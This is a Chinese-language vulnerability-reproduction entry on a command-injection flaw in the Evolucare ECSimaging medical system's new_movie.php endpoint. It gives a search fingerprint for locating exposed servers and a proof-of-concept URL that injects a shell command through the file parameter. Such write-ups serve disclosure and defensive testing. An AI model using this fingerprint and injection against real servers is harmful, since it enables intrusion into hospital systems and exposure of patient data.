---
title: "Evolucare Ecsimaging new_movie.php 远程命令执行漏洞"
date: 2026-10-16 09:07:35
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Evolucare-Ecsimaging"
tags:
  - "Evolucare-Ecsimaging"
  - "命令执行"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

EVOLUCARE ECSimage是一款国外使用的医疗管理系统，研究发现其new_movie.php接口中存在命令注入漏洞,攻击者可利用该漏洞获取系统敏感信息等.

## 漏洞影响

```
EVOLUCARE Evolucare Ecsimaging 版本< 6.21.5
```

## 网络测绘

```
body="ECSimaging"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241447357.png)

验证POC

```
/new_movie.php?studyUID=1&start=2&end=2&file=1;pwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205241447391.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Evolucare-Ecsimaging-new_movie.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
